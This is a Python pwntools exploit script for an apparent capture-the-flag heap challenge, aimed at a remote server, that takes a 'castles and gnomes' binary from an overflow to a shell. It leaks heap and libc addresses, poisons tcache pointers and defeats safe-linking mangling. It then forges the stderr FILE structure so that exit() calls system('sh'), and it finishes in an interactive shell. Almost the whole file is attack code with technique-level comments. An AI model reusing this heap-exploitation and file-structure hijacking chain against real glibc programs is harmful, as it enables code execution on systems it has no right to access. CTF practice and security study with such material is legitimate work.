#!/usr/bin/env python3
"""
Note: The feasibility of the exploit determines heavily on the speed of the connection.
For local testing you may need to uncomment the lines in gnomes() and build()
This script is intended to work for remote testing on a slower internet connection
"""
from pwn import *

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.40.so")
libcstdcplusplus = ELF("./libstdc++.so.6")

GDB_SCRIPT = f"""
set disassembly-flavor intel
"""

context.binary = exe
context.aslr = True
# IP     = 'localhost'   
IP = 'challs2.nusgreyhats.org'
PORT   = 35131

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

# gnome_data: array of integers of length numgnomes
def build(idx, numgnomes, gnome_data):
  sla(b"Your choice: ", b"1")
  sla(b"Where do you want to build it? ", str(idx).encode() + b' ')
  sla(b"How many gnomes? ", str(numgnomes).encode() + b' ')
  pl = b""
  for i in range(numgnomes):
    pl += str(gnome_data[i]).encode()
    pl += b" "
    # sl(str(gnome_data[i]).encode() + b' ')
    # sleep(0.03)
  sl(pl)

# castles[castle1idx] cannot be null and castles[castle2idx] must be null
def move(castle1idx, castle2idx):
  sla(b"Your choice: ", b"2")
  sla(b"What castle do you want to move? ", str(castle1idx).encode() + b' ')
  sla(b"Where do you want to move it? ", str(castle2idx).encode() + b' ')

def gnomes(castleidx, numgnomes, gnome_data):
  sla(b"Your choice: ", b"3")
  sla(b"What castle do you want to victimize? ", str(castleidx).encode() + b' ')
  sla(b"How many gnomes to let in? ", str(numgnomes).encode() + b' ')
  pl = b""
  for i in range(numgnomes):
    pl += str(gnome_data[i]).encode()
    pl += b" "
    # sl(str(gnome_data[i]).encode() + b' ')
    # sleep(0.03)
  sl(pl)

def look(castleidx):
  sla(b"Your choice: ", b"4")
  sla(b"What castle do you want to look at? ", str(castleidx).encode() + b' ')
  data = rl()[:-1].split(b" ") # space-separated integers
  return data # array of bytes

def remove(castleidx):
  sla(b"Your choice: ", b"5")
  sla(b"What castle do you want to remove? ", str(castleidx).encode() + b' ')

t = conn()
# context.log_level = 'debug'
build(0, 3, 3 * [0xcafe])
build(1, 2, 2 * [0xdead])
remove(1)
gnomes(0, 1, [0x1337])
x = look(0)
heap_leak = ((int(x[5].decode()) & 0xFFFFFFFF) << 32) + (int(x[4].decode()) & 0xFFFFFFFF)
lhex(heap_leak, "heap leak")
HEAP_ADDR = heap_leak - (0x00005e20b69d3318 - 0x5e20b69c1000)
lhex(HEAP_ADDR, "HEAP_ADDR")
remove(0)
# now we have 4 0x20 tcache chunks
build(0, 10, 10 * [0x1111]) # chunk A (40 bytes)
build(1, 20, 20 * [0x2222]) # chunk B (96 bytes)
build(2, 10, 10 * [0x1111]) # chunk C (40 bytes)
build(3, 20, 20 * [0x4444]) # chunk D (96 bytes)
build(4, 260, 260 * [0x5555]) # chunk E (unsorted bin)
build(5, 10, 10 * [0x6666]) # chunk F (40 bytes)
build(6, 20, 20 * [0x6666]) # chunk F2 (96 bytes)
build(15, 30, 30 * [0xdead]) # chunk G
remove(6)
remove(5)
remove(4)
remove(3)
remove(1) 
# expand A so it fills B
pl = [0x1337, 0x1337] # buffer
# target chunk G's vector
TARGET1 = HEAP_ADDR + (0x000059267fbca960 - 0x59267fbb8000) # <- address of chunk G's vector
lhex(TARGET1, "TARGET1")
MANGLED_TARGET1 = fastbin_encrypt(HEAP_ADDR + (0x56d1c74fb3f0 - 0x56d1c74e9000), TARGET1)
lhex(MANGLED_TARGET1, "MANGLED_TARGET1")
pl += [MANGLED_TARGET1 & 0xFFFFFFFF, MANGLED_TARGET1 >> 32] # overwrite D's metadata
gnomes(0, 4, pl)

# free C
remove(2)

# move the old chunk into chunk C (overflow into D)
move(0,2)
# we have now successfully overwritten into D's metadata, 
# rewriting its tcache pointer to point to G's vector
build(7, 20, 20 * [0x8888]) # VICTIM chunk
"""
heap at 0x5d704594c000
chunk I pointer at 0x00005d704595e450
libc leak at 0x5d704595e4d0
"""
# stuff at TARGET's vector (castle 7) we are overwriting
ptr1 = HEAP_ADDR + (0x00005d704595e450 - 0x5d704594c000)
ptr2 = HEAP_ADDR + (0x00005d704595e450 - 0x5d704594c000)
ptr3 = HEAP_ADDR + (0x5d704595e4d8 - 0x5d704594c000)
pl = [ptr1 & 0xFFFFFFFF, ptr1 >> 32, ptr2 & 0xFFFFFFFF, ptr2 >> 32, ptr3 & 0xFFFFFFFF, ptr3 >> 32]
pl += (20 - len(pl)) * [0x1337]
# print(pl)
# chunk H is the controlled chunk, which we allocated at G's vector
# so when we build H we are overwriting G's vector

build(8, 20, pl) # chunk H (96 bytes)
build(9, 20, [0xaaa] * 20) # make a new chunk I to manipulate

# now castle 15 (chunk G) is pointing to our controlled address
# get libc leak 
libc_leak = look(15)
libc_leak = ((int(libc_leak[-2].decode()) & 0xFFFFFFFF) << 32) + (int(libc_leak[-3].decode()) & 0xFFFFFFFF)
lhex(libc_leak, "LIBC LEAK")
libc.address = libc_leak - (0x0000762cebcc8b20 - 0x762cebab7000)
lhex(libc.address, "LIBC ADDRESS")

# Requires libc leak

stderr_addr = libc.sym._IO_2_1_stderr_

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr_addr-0x10 # Should be null
fs.chain = libc.sym.system
fs._codecvt = stderr_addr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = stderr_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps
fsb = bytes(fs)

lhex(libc.sym._IO_wfile_jumps, "libc.sym._IO_wfile_jumps")
#write fsb to stderr_addr , then call exit

pl2 = [stderr_addr & 0xFFFFFFFF, stderr_addr >> 32, stderr_addr & 0xFFFFFFFF, stderr_addr >> 32, (0x600 + stderr_addr) & 0xFFFFFFFF, (0x600 + stderr_addr) >> 32]

gnomes(15, 6, pl2)
# use chunk G to overwrite chunk I's vector, making it point to the 
# libc stderr struct
pl3 = []
for i in range(0, len(fsb), 4):
    pl3 += [u32(fsb[i:i+4])]

# overwrite stderr struct
gnomes(9, len(pl3), pl3)
# trigger exit()
look(14)
it()
